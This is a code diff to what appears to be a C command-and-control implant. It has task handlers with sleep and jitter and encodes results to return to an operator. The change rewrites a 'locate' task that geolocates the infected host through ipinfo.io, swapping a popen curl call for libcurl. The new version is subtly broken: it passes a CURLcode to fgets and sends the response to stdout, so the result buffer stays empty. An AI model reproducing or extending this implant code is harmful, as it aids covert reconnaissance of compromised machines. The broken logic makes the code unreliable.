@@ -5,6 +5,8 @@
 #include <string.h>
 #include <unistd.h>
 #include <sys/types.h>
+#include <curl/curl.h>
+
 #include "base64.h"
 #include "client.h"
 #include "tasks.h"
@@ -98,21 +100,36 @@ void task_sleep(char *sleep_time_str, char *jitter_str) {
 }
 
 void task_locate(const char *id_task) {
+    CURL *curl;
+    CURLcode res;
+
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    curl = curl_easy_init();
+
+    if(curl) {
+        // Set the URL
+        curl_easy_setopt(curl, CURLOPT_URL, "http://ipinfo.io");
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, stdout);
+        
+        // Perform the request
+        res = curl_easy_perform(curl);
+
+        // Check for errors
+        if(res != CURLE_OK) {
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        }
+
+        // Cleanup
+        curl_easy_cleanup(curl);
+    }
 
     char result_buffer[4096] = {0};
-
-    // Get localization info with curl CHANGE LE MODE
-    FILE *fp = popen("curl -s ipinfo.io", "r");
-    if (fp == NULL) {
-        perror("Erreur lors de l'exécution de curl");
-        return;
-    }
-
     char buffer[1024];
-    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
+    while (fgets(buffer, sizeof(buffer), res) != NULL) {
         strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
     }
-    pclose(fp);
+    curl_global_cleanup();
 
     // Encode the result
     char *encoded_result = encode(result_buffer);
